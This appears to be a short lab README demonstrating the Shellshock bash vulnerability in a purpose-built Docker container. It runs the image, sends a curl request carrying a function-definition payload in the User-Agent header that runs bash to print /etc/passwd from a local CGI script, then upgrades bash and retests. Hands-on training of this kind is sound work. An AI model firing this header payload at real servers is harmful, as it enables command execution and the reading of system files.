## ShellShock Expliot
- Pull the docker image

	`docker pull sharathwe45/shellshock`
	
- Run the docker image

	`docker run -d -p 8080:80 --name shellshock sharathwe45/shellshock`
	
- Expliot the vulnerability

	`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://localhost:8080/cgi-bin/stats`
	
	You should see the password printing for you on the screen
	
- Fix the vulnerability

	- List the running containers
		
		`docker ps`
	
	- Exec into the docker
	
		`docker exec -it shellshock bash`
		
	- Upgrade the bash 
	
		`apt-get update && apt-get install --only-upgrade bash`
		
- Now retest the vulnerability

	`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/	passwd;'" http://localhost:8080/cgi-bin/stats`
	
	You should not see the password printing for you on the screen
